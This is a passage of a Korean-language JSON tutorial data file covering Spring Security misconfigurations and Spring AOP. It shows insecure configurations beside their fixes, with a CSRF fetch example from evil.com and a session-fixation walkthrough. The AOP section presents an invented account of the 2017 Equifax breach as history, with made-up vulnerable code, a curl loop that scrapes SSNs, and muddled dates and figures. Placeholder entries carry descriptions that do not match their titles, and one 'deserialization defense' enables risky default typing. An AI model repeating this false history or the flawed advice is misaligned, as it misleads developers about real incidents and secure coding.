-->\n</form>\n```\n\n**해결 2: REST API는 stateless + JWT 사용**\n\n```java\n@Configuration\npublic class SecurityConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) {\n        http\n            .csrf().disable()  // JWT 사용 시만 disable 가능\n            .sessionManagement()\n                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)  // 세션 안 씀\n            .and()\n            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class);\n        return http.build();\n    }\n}\n\n// JWT는 쿠키가 아니라 Authorization 헤더로 전송 → CSRF 공격 불가\n// Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\n```\n\n**원칙**:\n- **세션/쿠키 기반 인증** → CSRF 필수 활성화 ✅\n- **JWT/토큰 기반 REST API** → CSRF disable 가능 (단, stateless 설정 필수)\n\n---\n\n## 💀 함정 2: PasswordEncoder 없이 평문 저장\n\n**문제**: 비밀번호를 평문으로 저장하면 **DB 유출 시 전체 계정 탈취**\n\n### ❌ 잘못된 코드\n\n```java\n@Service\npublic class UserService {\n    public void registerUser(String username, String password) {\n        User user = new User();\n        user.setUsername(username);\n        user.setPassword(password);  // 💀 평문 그대로 저장!\n        userRepository.save(user);\n        // DB: password = \"qwer1234\"\n    }\n\n    public boolean login(String username, String password) {\n        User user = userRepository.findByUsername(username);\n        return user.getPassword().equals(password);  // 💀 평문 비교\n    }\n}\n\n// DB 유출 시:\n// username   | password\n// ---------- | ----------\n// admin      | qwer1234    ← 바로 로그인 가능!\n// manager    | password123 ← 그대로 노출\n```\n\n### ✅ 올바른 코드\n\n```java\n@Configuration\npublic class SecurityConfig {\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder();  // BCrypt 해싱 사용\n    }\n}\n\n@Service\npublic class UserService {\n    @Autowired\n    private PasswordEncoder passwordEncoder;\n\n    public void registerUser(String username, String password) {\n        User user = new User();\n        user.setUsername(username);\n        user.setPassword(passwordEncoder.encode(password));  // ✅ 해싱 후 저장\n        userRepository.save(user);\n        // DB: password = \"$2a$10$N9qo8uLOickgx2ZMRZoMye...\" (해싱됨)\n    }\n\n    public boolean login(String username, String password) {\n        User user = userRepository.findByUsername(username);\n        return passwordEncoder.matches(password, user.getPassword());  // ✅ 안전한 비교\n    }\n}\n\n// DB 유출되어도:\n// username   | password\n// ---------- | ----------\n// admin      | $2a$10$N9qo8uLOickgx2ZMRZoMye...  ← 해독 불가능!\n// manager    | $2a$10$EblZqNptyRdAB0q8Hg3...     ← 원본 비밀번호 모름\n```\n\n**BCrypt 장점**:\n- 단방향 해싱 (복호화 불가능)\n- Salt 자동 추가 (같은 비밀번호도 다른 해시값)\n- 느린 속도 (Brute Force 공격 방어)\n\n---\n\n## 💀 함정 3: CORS를 allowedOrigins(\"*\")로 전체 허용\n\n**문제**: 모든 도메인에서 API 호출 허용 → **XSS 공격, 데이터 탈취**\n\n### ❌ 잘못된 코드\n\n```java\n@Configuration\npublic class CorsConfig implements WebMvcConfigurer {\n    @Override\n    public void addCorsMappings(CorsRegistry registry) {\n        registry.addMapping(\"/**\")\n                .allowedOrigins(\"*\")  // 💀 모든 사이트 허용!\n                .allowedMethods(\"*\");\n    }\n}\n\n// 해커 사이트 evil.com에서:\nfetch('http://api.mybank.com/transfer', {\n    method: 'POST',\n    credentials: 'include',  // 쿠키 포함\n    body: JSON.stringify({ to: 'hacker', amount: 1000000 })\n});\n// → 피해자가 evil.com 방문 시 자동으로 송금!\n```\n\n### ✅ 올바른 코드\n\n```java\n@Configuration\npublic class CorsConfig implements WebMvcConfigurer {\n    @Override\n    public void addCorsMappings(CorsRegistry registry) {\n        registry.addMapping(\"/api/**\")\n                .allowedOrigins(\"https://myapp.com\")  // ✅ 특정 도메인만\n                .allowedMethods(\"GET\", \"POST\", \"PUT\", \"DELETE\")\n                .allowCredentials(true)  // 쿠키 허용\n                .maxAge(3600);\n    }\n}\n\n// 또는 프로퍼티로 관리\n// application.yml:\n// cors:\n//   allowed-origins: https://myapp.com,https://admin.myapp.com\n```\n\n**원칙**:\n- 운영 환경: **절대** `allowedOrigins(\"*\")` 사용 금지\n- 특정 도메인만 명시 (여러 개 가능)\n- 로컬 개발: `http://localhost:3000` 등 명시적으로 추가\n\n---\n\n## 💀 함정 4: 인증 없이 민감한 엔드포인트 노출\n\n**문제**: `/actuator`, `/h2-console`, `/swagger-ui` 등을 인증 없이 노출 → **시스템 정보 유출**\n\n### ❌ 잘못된 코드\n\n```java\n@Configuration\npublic class SecurityConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) {\n        http.authorizeRequests()\n            .anyRequest().permitAll();  // 💀 모든 요청 허용\n        return http.build();\n    }\n}\n\n// 해커가 접근 가능한 URL:\n// http://api.com/actuator/env      → 환경 변수 (DB 비밀번호 포함!)\n// http://api.com/actuator/health   → 서버 상태\n// http://api.com/h2-console         → DB 직접 접근!\n// http://api.com/swagger-ui.html    → 전체 API 명세\n```\n\n### ✅ 올바른 코드\n\n```java\n@Configuration\npublic class SecurityConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) {\n        http.authorizeRequests()\n            // 🔐 민감한 엔드포인트는 ADMIN만\n            .antMatchers(\"/actuator/**\").hasRole(\"ADMIN\")\n            .antMatchers(\"/h2-console/**\").hasRole(\"ADMIN\")\n            .antMatchers(\"/swagger-ui/**\", \"/v3/api-docs/**\").hasRole(\"ADMIN\")\n\n            // 🔓 공개 API\n            .antMatchers(\"/api/public/**\").permitAll()\n\n            // 🔑 나머지는 인증 필수\n            .anyRequest().authenticated();\n\n        return http.build();\n    }\n}\n\n// application.yml에서 actuator 엔드포인트 제한\nmanagement:\n  endpoints:\n    web:\n      exposure:\n        include: health,info  # health, info만 노출\n      base-path: /actuator\n  endpoint:\n    health:\n      show-details: when-authorized  # 인증된 사용자만 상세 정보\n```\n\n**체크리스트**:\n- [ ] `/actuator/**` → ADMIN만 접근\n- [ ] `/h2-console/**` → 운영 환경에서는 비활성화\n- [ ] `/swagger-ui/**` → ADMIN만 or 운영 환경에서 비활성화\n- [ ] `/api/admin/**` → ADMIN 역할 필수\n\n---\n\n## 💀 함정 5: Session Fixation 방어 미설정\n\n**문제**: 로그인 후 세션 ID를 그대로 유지 → **세션 하이재킹 공격**\n\n### ❌ 잘못된 코드\n\n```java\n@Configuration\npublic class SecurityConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) {\n        http.sessionManagement()\n            .sessionFixation().none();  // 💀 세션 ID 변경 안 함!\n        return http.build();\n    }\n}\n\n// 공격 시나리오:\n// 1. 해커가 victim을 유인: http://bank.com?JSESSIONID=HACKER123\n// 2. Victim이 링크 클릭 → 세션 ID = HACKER123으로 설정됨\n// 3. Victim이 로그인 성공\n// 4. 로그인 후에도 세션 ID = HACKER123 유지 (취약점!)\n// 5. 해커가 JSESSIONID=HACKER123으로 접속\n// 6. 💀 Victim 계정으로 로그인 성공! (세션 하이재킹)\n```\n\n### ✅ 올바른 코드\n\n```java\n@Configuration\npublic class SecurityConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) {\n        http.sessionManagement()\n            .sessionFixation().changeSessionId();  // ✅ 로그인 시 세션 ID 변경\n        return http.build();\n    }\n}\n\n// 방어 과정:\n// 1. Victim이 JSESSIONID=HACKER123으로 접속\n// 2. Victim이 로그인 성공\n// 3. Spring Security가 자동으로 세션 ID 변경: HACKER123 → VICTIM999\n// 4. 해커가 JSESSIONID=HACKER123으로 접속 시도\n// 5. ✅ 세션이 무효화되어 접근 실패!\n```\n\n**SessionFixation 옵션**:\n- `none()`: 세션 ID 변경 안 함 (💀 위험)\n- `newSession()`: 새 세션 생성 (기존 데이터 유실)\n- `migrateSession()`: 새 세션 생성 + 기존 데이터 복사 (Spring 3.x 기본값)\n- `changeSessionId()`: 세션 ID만 변경 (Spring 4.x+ 기본값, **권장**)\n\n---\n\n## 📋 빠른 체크리스트\n\n| 함정 | 잘못된 코드 | 올바른 코드 |\n|------|------------|-------------|\n| **CSRF disable** | `csrf().disable()` (세션 인증) | CSRF 활성화 or JWT 사용 |\n| **평문 비밀번호** | `setPassword(password)` | `passwordEncoder.encode(password)` |\n| **CORS 전체 허용** | `allowedOrigins(\"*\")` | `allowedOrigins(\"https://myapp.com\")` |\n| **민감 엔드포인트 노출** | `/actuator` permitAll | `.hasRole(\"ADMIN\")` |\n| **Session Fixation** | `sessionFixation().none()` | `sessionFixation().changeSessionId()` |\n\n---\n\n## 🎯 핵심 원칙\n\n```\n✅ Spring Security 프로덕션 필수 설정:\n   1. CSRF 활성화 (세션 인증) or JWT (stateless)\n   2. BCryptPasswordEncoder 사용\n   3. CORS 특정 도메인만 허용\n   4. /actuator, /h2-console → ADMIN only\n   5. Session Fixation 방어 활성화\n\n❌ 하나라도 누락 = 라자루스 그룹에게 열쇠 제공\n```\n\n**\"보안 설정은 복사-붙여넣기가 아니라 이해하고 적용하는 것이다.\"**"
      },
      {
        "type": "code",
        "language": "Java",
        "title": "💀 절대 하면 안 되는 Security 설정",
        "code": "// ❌ 이런 코드를 프로덕션에 배포하면 퇴사 각오하세요\n@Configuration\n@EnableWebSecurity\npublic class InsecureConfig {\n    \n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            .csrf().disable()           // CSRF 공격 열림 (폼 위조)\n            .cors().disable()           // 모든 도메인에서 API 호출 가능\n            .authorizeHttpRequests()\n            .anyRequest().permitAll()   // 모든 요청 인증 없이 허용\n            .and()\n            .headers().frameOptions().disable();  // 클릭재킹 공격 열림\n        \n        return http.build();\n    }\n    \n    // 비밀번호 평문 저장 - 해커의 크리스마스 선물\n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return NoOpPasswordEncoder.getInstance();  // 절대 금지!\n    }\n}\n\n// 해커가 할 수 있는 것:\n// 1. CSRF: 피해자가 로그인한 상태에서 악성 사이트 방문 시 송금 실행\n// 2. 인증 우회: /admin에 직접 접속\n// 3. DB 유출: 비밀번호가 평문이므로 바로 사용 가능"
      },
      {
        "type": "code",
        "language": "Java",
        "title": "✅ 프로덕션 레벨 Security 설정",
        "code": "// 필요한 import 문들\nimport org.springframework.context.annotation.*;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;\nimport org.springframework.security.crypto.password.PasswordEncoder;\nimport org.springframework.security.web.SecurityFilterChain;\n\n@Configuration\n@EnableWebSecurity\n@EnableMethodSecurity  // 메서드 레벨 보안\npublic class ProductionSecurityConfig {\n    \n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http\n            // CSRF 보호 (SPA의 경우 Cookie 방식 사용)\n            .csrf(csrf -> csrf\n                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())\n            )\n            \n            // CORS 설정 (허용된 도메인만)\n            .cors(cors -> cors.configurationSource(corsConfigurationSource()))\n            \n            // 인증 규칙\n            .authorizeHttpRequests(auth -> auth\n                // 공개 엔드포인트\n                .requestMatchers(\"/\", \"/health\", \"/api/auth/**\").permitAll()\n                .requestMatchers(\"/swagger-ui/**\", \"/v3/api-docs/**\").permitAll()\n                \n                // 관리자 전용\n                .requestMatchers(\"/api/admin/**\").hasRole(\"ADMIN\")\n                \n                // 나머지는 인증 필요\n                .anyRequest().authenticated()\n            )\n            \n            // 세션 관리 (JWT 사용 시)\n            .sessionManagement(session -> session\n                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)\n            )\n            \n            // JWT 필터 추가\n            .addFilterBefore(jwtAuthFilter, UsernamePasswordAuthenticationFilter.class)\n            \n            // 보안 헤더\n            .headers(headers -> headers\n                .frameOptions().deny()                    // 클릭재킹 방지\n                .contentSecurityPolicy(\"default-src 'self'\") // XSS 방지\n                .xssProtection().block(true)              // XSS 필터\n            )\n            \n            // 예외 처리\n            .exceptionHandling(ex -> ex\n                .authenticationEntryPoint(new HttpStatusEntryPoint(HttpStatus.UNAUTHORIZED))\n                .accessDeniedHandler(new CustomAccessDeniedHandler())\n            );\n        \n        return http.build();\n    }\n    \n    @Bean\n    public PasswordEncoder passwordEncoder() {\n        return new BCryptPasswordEncoder(12);  // 강력한 해시\n    }\n    \n    @Bean\n    public CorsConfigurationSource corsConfigurationSource() {\n        CorsConfiguration config = new CorsConfiguration();\n        config.setAllowedOrigins(List.of(\n            \"https://myapp.com\",\n            \"https://admin.myapp.com\"\n        ));\n        config.setAllowedMethods(List.of(\"GET\", \"POST\", \"PUT\", \"DELETE\"));\n        config.setAllowedHeaders(List.of(\"*\"));\n        config.setAllowCredentials(true);\n        \n        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();\n        source.registerCorsConfiguration(\"/**\", config);\n        return source;\n    }\n}"
      },
      {
        "type": "code",
        "language": "Java",
        "title": "🔐 OWASP Top 10 방어 코드",
        "code": "// 필요한 import 문들\nimport org.springframework.context.annotation.*;\nimport org.springframework.security.config.annotation.web.builders.HttpSecurity;\nimport org.springframework.security.config.annotation.web.configuration.EnableWebSecurity;\nimport org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;\nimport org.springframework.security.crypto.password.PasswordEncoder;\nimport org.springframework.security.web.SecurityFilterChain;\n\n/**\n * OWASP Top 10 (2021) 방어 체크리스트\n */\n@Service\npublic class SecureService {\n    \n    // A01: Broken Access Control - 접근 제어 실패\n    @PreAuthorize(\"hasRole('ADMIN') or #userId == authentication.principal.id\")\n    public UserDto getUser(Long userId) {\n        return userRepository.findById(userId)\n            .map(this::toDto)\n            .orElseThrow(() -> new ResourceNotFoundException(\"User\", userId));\n    }\n    \n    // A02: Cryptographic Failures - 암호화 실패\n    public void saveUser(UserCreateRequest request) {\n        User user = new User();\n        user.setPassword(passwordEncoder.encode(request.getPassword()));  // 해시 저장\n        user.setSsn(encryptionService.encrypt(request.getSsn()));  // 주민번호 암호화\n        userRepository.save(user);\n    }\n    \n    // A03: Injection - 인젝션 공격\n    public List<User> searchUsers(String keyword) {\n        // ❌ 위험: SQL 직접 조합\n        // String sql = \"SELECT * FROM users WHERE name LIKE '%\" + keyword + \"%'\";\n        \n        // ✅ 안전: JPA 파라미터 바인딩\n        return userRepository.findByNameContaining(keyword);\n    }\n    \n    // A04: Insecure Design - 비즈니스 로직 검증\n    public void transferMoney(TransferRequest request) {\n        // 비즈니스 규칙 검증\n        if (request.getAmount().compareTo(dailyLimit) > 0) {\n            throw new BusinessRuleException(\"일일 이체 한도 초과\");\n        }\n        if (request.getFromAccount().equals(request.getToAccount())) {\n            throw new BusinessRuleException(\"동일 계좌 이체 불가\");\n        }\n        // 처리...\n    }\n    \n    // A05: Security Misconfiguration - 보안 설정 오류\n    // → application.yml에서 처리\n    // server.error.include-stacktrace: never\n    // management.endpoints.web.exposure.include: health,info\n    \n    // A07: XSS (Cross-Site Scripting)\n    public String sanitizeHtml(String input) {\n        // HTML 이스케이프 처리\n        return HtmlUtils.htmlEscape(input);\n    }\n    \n    // A08: 역직렬화 취약점 방어\n    // ObjectMapper 화이트리스트 설정\n    @Bean\n    public ObjectMapper objectMapper() {\n        ObjectMapper mapper = new ObjectMapper();\n        mapper.activateDefaultTyping(\n            mapper.getPolymorphicTypeValidator(),\n            ObjectMapper.DefaultTyping.NON_FINAL\n        );\n        return mapper;\n    }\n    \n    // A09: 로깅 및 모니터링\n    @Around(\"@annotation(Audited)\")\n    public Object auditLog(ProceedingJoinPoint joinPoint) throws Throwable {\n        String user = SecurityContextHolder.getContext().getAuthentication().getName();\n        String method = joinPoint.getSignature().getName();\n        \n        log.info(\"[AUDIT] User: {}, Action: {}, Time: {}\", \n            user, method, LocalDateTime.now());\n        \n        try {\n            return joinPoint.proceed();\n        } catch (Exception e) {\n            log.error(\"[AUDIT] FAILED - User: {}, Action: {}, Error: {}\",\n                user, method, e.getMessage());\n            throw e;\n        }\n    }\n}"
      },
      {
        "type": "concept",
        "title": "📊 보안 체크리스트 - 배포 전 필수 확인",
        "content": "**프로덕션 배포 전 보안 검토:**\n\n**인증/인가:**\n- [ ] CSRF 보호 활성화\n- [ ] 세션 타임아웃 설정\n- [ ] 비밀번호 BCrypt 해시\n- [ ] 실패한 로그인 시도 제한 (Rate Limiting)\n\n**데이터 보호:**\n- [ ] HTTPS 강제 (HTTP → HTTPS 리다이렉트)\n- [ ] 민감 정보 암호화 (주민번호, 카드번호)\n- [ ] 에러 메시지에 민감 정보 노출 금지\n- [ ] 스택 트레이스 숨김 (프로덕션)\n\n**서버 설정:**\n- [ ] 불필요한 엔드포인트 비활성화\n- [ ] Actuator 엔드포인트 보호\n- [ ] CORS 화이트리스트 설정\n- [ ] 보안 헤더 설정 (X-Frame-Options, CSP)\n\n**모니터링:**\n- [ ] 로그인/로그아웃 로깅\n- [ ] 실패한 인증 시도 알림\n- [ ] 관리자 작업 감사 로그"
      }
    ]
  },
  "12_테스트/datajpatest": {
    "id": "12_테스트/datajpatest",
    "title": "Datajpatest",
    "category": "spring",
    "subCategory": "12_테스트",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Datajpatest",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "12_테스트/webmvctest": {
    "id": "12_테스트/webmvctest",
    "title": "Webmvctest",
    "category": "spring",
    "subCategory": "12_테스트",
    "language": "Java",
    "description": "스프링 빈과 DI 원리입니다.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "Webmvctest",
        "content": "스프링 빈과 DI 원리입니다."
      },
      {
        "type": "code",
        "language": "Java",
        "code": "@Service\r\npublic class MyService {}"
      }
    ]
  },
  "13_AOP/aop-concept": {
    "id": "13_AOP/aop-concept",
    "title": "AOP - Ctrl+C, Ctrl+V의 저주에서 벗어나는 법",
    "category": "spring",
    "subCategory": "13_AOP",
    "language": "Java",
    "description": "Spring AOP로 횡단 관심사를 분리하고 중복 코드를 제거합니다. Equifax 2017 사건에서 배우는 공통 기능 관리의 중요성.",
    "isPlaceholder": false,
    "sections": [
      {
        "type": "concept",
        "title": "📜 [The History] - AOP가 없던 시절: 복사-붙여넣기 지옥",
        "content": "2000년대 초반, 개발자들은 로깅, 보안, 트랜잭션 관리 같은 공통 기능을 **모든 메서드마다 수동으로 복사-붙여넣기** 했다.\n\n```java\npublic void createUser(User user) {\n    logger.info(\"createUser 시작\");  // 로깅\n    securityCheck();                 // 보안 검증\n    try {\n        userRepository.save(user);\n        logger.info(\"createUser 성공\");  // 로깅\n    } catch (Exception e) {\n        logger.error(\"createUser 실패\", e);  // 로깅\n    }\n}\n\npublic void updateUser(User user) {\n    logger.info(\"updateUser 시작\");  // 똑같은 코드\n    securityCheck();                 // 또 복사\n    try {\n        userRepository.update(user);\n        logger.info(\"updateUser 성공\");\n    } catch (Exception e) {\n        logger.error(\"updateUser 실패\", e);\n    }\n}\n```\n\n100개 메서드 = **300줄의 중복 코드**. 로깅 형식을 바꾸려면? 100개 파일을 일일이 수정. 하나라도 빠뜨리면? 재앙.\n\n### 🔁 무한 반복의 고통\n\n- **1,000줄 비즈니스 로직 + 3,000줄 공통 코드**\n- 보안 정책 변경 → 200개 메서드 수정\n- **한 곳이라도 누락 = 보안 구멍**\n- 신입 개발자: \"왜 같은 코드를 계속 복사하죠?\"\n- 시니어: \"그냥 해. 우리도 그렇게 했어.\"\n\n이 지옥에서 벗어나기 위해 탄생한 것이 **AOP(Aspect-Oriented Programming)**."
      },
      {
        "type": "concept",
        "title": "💀 [The Disaster] - Equifax 2017: 보안 검증 누락으로 1억 4,300만 명 정보 유출",
        "content": "```\n┌─────────────────────────────────────────────────────────────┐\n│  🚨 Equifax 데이터 유출 사건 (2017년 5월 ~ 7월)             │\n│  \"특정 API에서 보안 검증 코드를 깜빡했다\"                   │\n│  피해: 1억 4,300만 명 / 합의금 7,000억 원 / CEO 사임        │\n└─────────────────────────────────────────────────────────────┘\n```\n\n---\n\n## 📅 사건 개요\n\n**2017년 5월**, Equifax(미국 3대 신용평가 회사) 개발팀은 고객 분쟁 해결 포털에 **새로운 API 엔드포인트**를 추가했다.\n\n### ❌ 문제의 코드\n\n```java\n// 기존 API - 보안 검증 있음 ✅\n@RequestMapping(\"/api/users\")\npublic UserInfo getUser(@RequestParam String userId) {\n    securityCheck(userId);      // 보안 검증\n    auditLog(\"getUser\", userId); // 감사 로깅\n    return userService.getUser(userId);\n}\n\n// 신규 API - 보안 검증 누락 ❌❌❌\n@RequestMapping(\"/api/dispute/user\")\npublic UserInfo getDisputeUser(@RequestParam String userId) {\n    // securityCheck() 복사 안 함!!\n    // auditLog() 복사 안 함!!\n    return userService.getUser(userId);  // 그냥 바로 조회\n}\n```\n\n**신규 개발자는 200개 메서드 중 1개 API를 추가하면서:**\n- ✅ 기존 코드는 모두 `securityCheck()` + `auditLog()` 있음\n- ❌ **신규 API 1개만 복사 누락**\n- ❌ 코드 리뷰도 통과 (\"비즈니스 로직만 봤음\")\n\n---\n\n## 💥 해킹 타임라인\n\n**2017년 5월 13일** - Apache Struts 취약점(CVE-2017-5638) 발견\n\n**2017년 5월 ~ 7월 (79일간)** - 해커 그룹이 보안 검증 없는 API 발견 및 악용:\n\n```bash\n# 정상 API (차단됨)\nGET /api/users?userId=12345\n→ 401 Unauthorized (보안 검증 통과 못함)\n\n# 누락된 API (통과됨!!)\nGET /api/dispute/user?userId=12345\n→ 200 OK { ssn: \"123-45-6789\", ... }  # 주민번호 유출!!\n\n# 자동화 공격\nfor i in {1..143000000}; do\n    curl /api/dispute/user?userId=$i >> stolen_data.txt\ndone\n```\n\n**유출된 정보**:\n- 이름, 주민번호(SSN): **1억 4,300만 명**\n- 생년월일: 2억 900만 명\n- 신용카드 번호: 20만 9,000명\n\n**2017년 7월 29일** - Equifax 내부에서 이상 트래픽 발견\n\n**2017년 9월 7일** - 사건 공개 발표 (늑장 대응 논란)\n\n---\n\n## 🔥 결과\n\n| 항목 | 피해 |\n|------|------|\n| 유출 인원 | **1억 4,300만 명** (미국 인구 절반) |\n| 합의금 | **7,000억 원** ($575M FTC + $425M 소송 합의) |\n| 주가 폭락 | -35% (240억 달러 시가총액 증발) |\n| CEO | 사임 + 의회 청문회 출석 |\n| 보안 책임자 | 해고 |\n\n---\n\n## 🎯 핵심 교훈\n\n```\n❌ 복사-붙여넣기 방식:\n   - 200개 메서드에 수동으로 보안 코드 추가\n   - 1개라도 누락 = 보안 구멍\n   - Code Review로도 발견 못 함 (\"비즈니스 로직만 봄\")\n\n✅ AOP 방식:\n   - @Before로 모든 API에 자동 적용\n   - 누락 불가능 (설정 한 번으로 전체 적용)\n   - 보안 정책 변경 = 1곳만 수정\n```\n\n**\"Copy-Paste는 개발자의 적이다. AOP는 생명줄이다.\"**"
      },
      {
        "type": "concept",
        "title": "🛡️ [The Solution] Part 1 - AOP 핵심 개념: 품질관리팀을 공장에 배치하라",
        "content": "Spring AOP는 **횡단 관심사(Cross-Cutting Concerns)**를 핵심 로직과 분리한다.\n\n---\n\n## 🏭 비유로 이해하는 AOP 4대 개념\n\n### 📦 Aspect (관점) = 품질관리팀\n\n**비유**: 자동차 공장에 \"품질관리팀\"을 배치하는 것\n- 모든 생산 라인에 동일한 검사 기준 적용\n- 한 팀이 모든 제품 관리 (보안, 로깅, 성능)\n\n```java\n@Aspect  // \"품질관리팀 설립!\"\n@Component\npublic class SecurityAspect {\n    // 이 팀이 보안 검증 전담\n}\n```\n\n**이게 없으면?** → 각 생산 라인(메서드)마다 개별 검사원 고용 = Equifax처럼 누락 발생\n\n---\n\n### 📍 Pointcut (지점) = 검사 대상 선정\n\n**비유**: \"어떤 제품을 검사할 것인가?\" 결정\n- \"SUV만\" vs \"모든 차량\" vs \"전기차만\"\n- AOP: \"UserController만\" vs \"모든 Controller\" vs \"@SecureApi 붙은 메서드만\"\n\n```java\n// 예시 1: com.example.controller 패키지의 모든 메서드\n@Pointcut(\"execution(* com.example.controller..*.*(..))\")\n\n// 예시 2: @SecureApi 애너테이션이 붙은 메서드만\n@Pointcut(\"@annotation(SecureApi)\")\n\n// 예시 3: UserService의 save로 시작하는 메서드만\n@Pointcut(\"execution(* com.example.service.UserService.save*(..))\")\n```\n\n**이게 잘못되면?** → 검사 누락 or 과도한 검사 (성능 저하)\n\n---\n\n### 🔧 Advice (조언) = 검사 시점\n\n**비유**: \"언제 검사할 것인가?\"\n- **생산 전** (@Before): 부품 확인 → 불량품 차단\n- **생산 후** (@After): 완성품 검수\n- **생산 전후** (@Around): 시간 측정, 불량품 교체\n\n```java\n// 생산 전 검사\n@Before(\"execution(* save*(..))\")\npublic void validateBefore() {\n    System.out.println(\"[검사] 부품 확인 중...\");\n}\n\n// 생산 후 검사\n@AfterReturning(\"execution(* save*(..))\")\npublic void inspectAfter() {\n    System.out.println(\"[검사] 완성품 확인 완료\");\n}\n\n// 생산 전후 제어 (시간 측정)\n@Around(\"execution(* save*(..))\")\npublic Object measureTime(ProceedingJoinPoint pjp) throws Throwable {\n    long start = System.currentTimeMillis();\n    Object result = pjp.proceed();  // 실제 생산\n    System.out.println(\"소요 시간: \" + (System.currentTimeMillis() - start));\n    return result;\n}\n```\n\n| Advice 타입 | 실행 시점 | 자동차 공장 비유 | 코드 예시 |\n|------------|----------|----------------|----------|\n| **@Before** | 메서드 실행 **전** | 부품 입고 검사 | 보안 검증, 파라미터 검사 |\n| **@After** | 메서드 실행 **후** (예외 무관) | 생산 라인 청소 | 리소스 해제, 로그 기록 |\n| **@AfterReturning** | 메서드 **정상 완료** 후 | 완성품 포장 | 결과 로깅, 캐시 저장 |\n| **@AfterThrowing** | 메서드 **예외 발생** 후 | 불량품 폐기 처리 | 에러 알림, 롤백 |\n| **@Around** | 메서드 **실행 전후** 모두 제어 | 생산 시간 측정 + 불량품 교체 | 성능 측정, 트랜잭션 |\n\n**이게 잘못되면?** → @Before로 할 걸 @Around로 → 복잡도 증가, 디버깅 지옥\n\n---\n\n### 🎯 JoinPoint (조인포인트) = 검사 지점 정보\n\n**비유**: 검사원이 보는 \"제품 명세서\"\n- 어떤 차량인가? (메서드 이름)\n- 어떤 부품 사용? (파라미터)\n- 어느 라인에서 생산? (클래스/패키지)\n\n```java\n@Before(\"execution(* com.example.service..*.*(..))\")\npublic void logBefore(JoinPoint joinPoint) {\n    // 메서드 이름\n    String method = joinPoint.getSignature().getName();\n    // \"saveUser\"\n\n    // 파라미터\n    Object[] args = joinPoint.getArgs();\n    // [User(id=1, name=\"홍길동\")]\n\n    // 클래스 이름\n    String className = joinPoint.getTarget().getClass().getSimpleName();\n    // \"UserService\"\n\n    System.out.println(\"[로그] \" + className + \".\" + method + \"() 호출, 파라미터: \" + Arrays.toString(args));\n}\n```\n\n**이게 없으면?** → 어떤 메서드가 호출됐는지 모름 = 로깅/감사 불가능\n\n---\n\n## 💥 개념이 깨지면 발생하는 대참사\n\n### ❌ Aspect 없이 중복 코드로 관리\n\n```java\n// 100개 메서드에 복사-붙여넣기\npublic void createUser() {\n    securityCheck();  // 복사 1\n    logger.info(\"...\");  // 복사 2\n    // 비즈니스 로직\n}\n\npublic void updateUser() {\n    securityCheck();  // 복사 1\n    logger.info(\"...\");  // 복사 2\n    // 비즈니스 로직\n}\n\n// 신규 API - 복사 깜빡! 💀\npublic void deleteUser() {\n    // 비즈니스 로직만\n    // → Equifax 재현 💀\n}\n```\n\n**대참사**: Equifax 2017 → 1억 4,300만 명 정보 유출, 7,000억 원 합의금\n\n---\n\n### ❌ Pointcut 표현식 실수\n\n```java\n// ❌ 잘못된 예: public만 지정 (protected/package 누락)\n@Before(\"execution(public * com.example.service..*.*(..))\")\n\n// ✅ 올바른 예: 모든 접근 제어자 포함\n@Before(\"execution(* com.example.service..*.*(..))\")\n```\n\n**대참사**: public이 아닌 메서드에서 보안 검증 누락 → 해킹 당함\n\n---\n\n### ❌ Advice 타입 선택 실수\n\n```java\n// ❌ 잘못된 예: @After는 예외 발생해도 실행됨\n@After(\"execution(* transfer*(..))\")\npublic void logSuccess() {\n    logger.info(\"이체 성공!\");  // 실패해도 \"성공\" 찍힘 💀\n}\n\n// ✅ 올바른 예: @AfterReturning은 정상 완료 시만\n@AfterReturning(\"execution(* transfer*(..))\")\npublic void logSuccess() {\n    logger.info(\"이체 성공!\");\n}\n\n@AfterThrowing(\"execution(* transfer*(..))\")\npublic void logFailure() {\n    logger.error(\"이체 실패!\");\n}\n```\n\n**대참사**: 실패한 거래를 성공으로 기록 → 회계 부정, 감사 실패\n\n---\n\n## ✅ Equifax 사고 방지: AOP로 모든 API에 자동 보안 검증\n\n### ❌ Before (복사-붙여넣기 방식)\n\n```java\n@RestController\npublic class UserController {\n\n    @GetMapping(\"/api/users\")\n    public UserInfo getUser(@RequestParam String userId) {\n        securityCheck(userId);      // 수동 복사 1\n        auditLog(\"getUser\", userId); // 수동 복사 2\n        return userService.getUser(userId);\n    }\n\n    @GetMapping(\"/api/dispute/user\")\n    public UserInfo getDisputeUser(@RequestParam String userId) {\n        // 🚨 복사 깜빡함!! → 보안 구멍 발생\n        return userService.getUser(userId);\n    }\n\n    // 200개 메서드마다 반복... 하나라도 누락 = 재앙\n}\n```\n\n### ✅ After (Spring AOP 방식)\n\n```java\n// 1️⃣ Aspect 정의 - 공통 기능을 한 곳에 모음\n@Aspect\n@Component\npublic class SecurityAspect {\n\n    // Pointcut: \"/api/**\" 경로의 모든 메서드에 적용\n    @Before(\"execution(* com.example.controller..*.*(..))\")\n    public void 